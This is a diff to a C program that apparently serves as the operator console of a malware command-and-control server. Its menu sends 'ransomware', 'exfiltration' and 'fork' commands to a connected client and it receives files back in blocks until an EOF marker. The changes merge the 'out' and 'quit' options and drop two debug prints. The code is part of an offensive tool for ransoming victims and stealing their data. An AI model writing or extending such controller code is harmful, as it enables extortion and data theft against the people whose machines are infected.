@@ -86,8 +86,7 @@ int main()
             printf("1. ransomware\n");
             printf("2. exfiltration\n");
             printf("3. fork\n");
-            printf("4. out\n");
-            printf("5. quit (disconnect client)\n");
+            printf("4. out (disconnect client)\n");
             printf("Choice: ");
 
             int choice;
@@ -139,9 +138,6 @@ int main()
                 case 4:
                     command = "out";
                     break;
-                case 5:
-                    command = "quit";
-                    break;
                 default:
                     printf("Invalid choice. Please select a valid option.\n");
                     continue;
@@ -157,7 +153,7 @@ int main()
                 printf("Command sent: %s\n", command);
 
                 // Si la commande est "quit", on déconnecte le client
-                if (strcmp(command, "quit") == 0)
+                if (strcmp(command, "out") == 0)
                 {
                     printf("Disconnecting client...\n");
                     break;
@@ -183,9 +179,6 @@ int main()
                         perror("Erreur lors de l'écriture dans le fichier");
                         break;
                     }
-                    printf("Bloc reçu et écrit dans le fichier.\n");
-                    printf("Valeur de bytes_read : %d", bytes_read);
-
                     if (strncmp(buffer, "EOF", 3) == 0)
                     {
                         printf("Fin du fichier reçue. Arrêt de la réception.\n");
